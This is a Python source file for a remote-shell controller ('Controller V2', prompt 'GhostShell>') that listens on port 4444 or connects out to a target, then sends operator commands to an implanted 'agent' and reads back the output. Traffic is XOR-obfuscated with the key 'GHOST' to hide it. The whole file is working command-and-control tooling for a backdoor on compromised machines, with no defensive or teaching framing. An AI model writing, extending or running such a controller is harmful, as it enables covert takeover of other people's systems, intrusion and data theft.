import socket
import argparse
import sys
import threading
import time

# --- CONFIGURATION ---
XOR_KEY = b"GHOST" 

def xor_cipher(data):
    """Stateless XOR encryption matching agent."""
    if not data: return b""
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])

def handle_session(sock):
    """Handles the V2 protocol session."""
    try:
        # 1. Wait for Cleartext Handshake
        handshake = sock.recv(1024).decode(errors='ignore')
        print(f"\n[+] Target Says: {handshake.strip()}")
        
        if "GHOST" not in handshake:
            print("[!] Warning: Target did not send expected handshake.")

        print("[*] Starting Encrypted Session. Type 'exit' to quit.\n")

        while True:
            cmd = input("GhostShell> ")
            if not cmd: continue
            
            if cmd.lower() in ['exit', 'quit']:
                sock.send(xor_cipher(b"exit"))
                break

            # 2. Send Encrypted Command
            sock.send(xor_cipher(cmd.encode()))
            
            # 3. Receive Encrypted Response until MARKER
            full_response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                
                decoded_chunk = xor_cipher(chunk)
                full_response += decoded_chunk
                
                if b"MARKER" in decoded_chunk:
                    break
            
            # Clean up marker and print
            clean_response = full_response.replace(b"\nMARKER", b"").replace(b"MARKER", b"")
            print(clean_response.decode(errors='ignore'))
            
    except KeyboardInterrupt:
        print("\n[*] Closing...")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()

def start_server(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"[*] Controller V2 listening on {port}...")
    
    try:
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}")
        handle_session(conn)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()

def connect_to_target(ip, port):
    print(f"[*] Connecting to {ip}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        print("[+] Connected!")
        handle_session(s)
    except Exception as e:
        print(f"[!] Connection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="mode")
    
    listen = subparsers.add_parser("listen")
    listen.add_argument("--port", type=int, default=4444)
    
    connect = subparsers.add_parser("connect")
    connect.add_argument("ip")
    connect.add_argument("port", type=int)
    
    args = parser.parse_args()
    
    if args.mode == "listen":
        start_server(args.port)
    elif args.mode == "connect":
        connect_to_target(args.ip, args.port)
    else:
        parser.print_help()